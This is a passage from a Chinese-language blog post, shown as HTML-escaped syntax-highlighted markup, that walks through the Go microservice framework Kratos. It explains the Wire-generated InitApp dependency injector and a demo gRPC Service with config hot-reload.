&lt;p>简单来说就是Golang的依赖注入代码生成器, 它不使用反射.由Google提供.&lt;/p>
&lt;/blockquote>
&lt;p>不过&lt;code>Wire&lt;/code>不是我们的重点, 我们接着回到&lt;code>di.InitApp()&lt;/code>去。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;span class="lnt">81
&lt;/span>&lt;span class="lnt">82
&lt;/span>&lt;span class="lnt">83
&lt;/span>&lt;span class="lnt">84
&lt;/span>&lt;span class="lnt">85
&lt;/span>&lt;span class="lnt">86
&lt;/span>&lt;span class="lnt">87
&lt;/span>&lt;span class="lnt">88
&lt;/span>&lt;span class="lnt">89
&lt;/span>&lt;span class="lnt">90
&lt;/span>&lt;span class="lnt">91
&lt;/span>&lt;span class="lnt">92
&lt;/span>&lt;span class="lnt">93
&lt;/span>&lt;span class="lnt">94
&lt;/span>&lt;span class="lnt">95
&lt;/span>&lt;span class="lnt">96
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// Injectors from wire.go:
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">InitApp&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">App&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 基本上就是创建一个个实例，和善后它们的函数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 如果途中创建出问题就全体下葬（触发善后函数）.
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// Redis实例，善后函数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">redis&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cleanup&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">dao&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewRedis&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// memcache实例，善后函数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">memcache&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cleanup2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">dao&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewMC&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 看起来只支持MySQL，善后函数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cleanup3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">dao&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewDB&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">cleanup2&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 把上面所有的模型对象做一个DAO层封装
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">daoDao&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cleanup4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">dao&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">redis&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">memcache&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">cleanup3&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup2&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 这个是个重点，`service`是你的gRPC服务.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 一会我们去分析他
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">serviceService&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cleanup5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">service&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">daoDao&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">cleanup4&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup3&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup2&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 有人会好奇Kratos是怎么把gRPC和Gin融合在一起的
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//（没错Bilibili的web框架是Gin, 不过这个Gin的一部分核心代码已经被魔改过了， 在Engine初始化的时候会多加入一个链路追踪的Middleware, 还有一堆路由...）
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 秘密就在这里，等会我们再看
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">engine&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">serviceService&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">cleanup5&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup4&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup3&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup2&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// gRPC的初始化的常规操作
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">server&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">grpc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">serviceService&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">cleanup5&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup4&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup3&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup2&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 把上面的服务，engine,gRPC服务,整一块
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 善后函数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 后面稍微分析一下
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">app&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cleanup6&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nf">NewApp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">serviceService&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">engine&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">cleanup5&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup4&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup3&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup2&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 你可以走了.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="nx">app&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">cleanup6&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup5&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup4&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup3&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup2&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">//以上代码全是自动生成，冗余很正常
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>接下来我们首先看看&lt;code>serviceService&lt;/code>是个什么东西.&lt;em>(这是什么魔鬼命名)&lt;/em>&lt;/p>
&lt;p>进到&lt;code>Service.New(dao)&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-go" data-lang="go">
&lt;span class="c1">// Service service.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">Service&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 配置文件映射的Map (这个命名就nm离谱)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">ac&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">paladin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Map&lt;/span>
&lt;span class="c1">// 字面意思
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">dao&lt;/span> &lt;span class="nx">dao&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Dao&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// New new a service and return.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span> &lt;span class="nx">dao&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Dao&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Service&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cf&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 初始化～～～
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">Service&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">ac&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">paladin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TOML&lt;/span>&lt;span class="p">{},&lt;/span>
&lt;span class="nx">dao&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">d&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 一个关闭的钩子
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">cf&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Close&lt;/span>
&lt;span class="c1">// 热加载 application.toml 配置文件
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 原理是使用fsnotify监听文件变更
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">paladin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Watch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;application.toml&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ac&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// -------------- 下面都是你的gRPC业务逻辑-------------
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// SayHello grpc demo func.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Service&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">SayHello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HelloReq&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">reply&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">empty&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">reply&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">empty&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// SayHelloURL bm demo func.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Service&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">SayHelloURL&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HelloReq&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">reply&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HelloResp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">reply&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HelloResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Content&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;hello &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Name&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello url %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Ping ping the resource.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Service&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">e&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">empty&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">empty&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">empty&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dao&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Close close the resource.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Service&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>哇哦，现在我们知道了，&lt;code>Service&lt;/code>是由一些&lt;code>gRPC&lt;/code>方法，配置项，模型层组成的。&lt;/p>
&lt;p>好，乘胜追击我们再看一看&lt;code>engine, err := http.New(serviceService)&lt;/code>做了什么。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
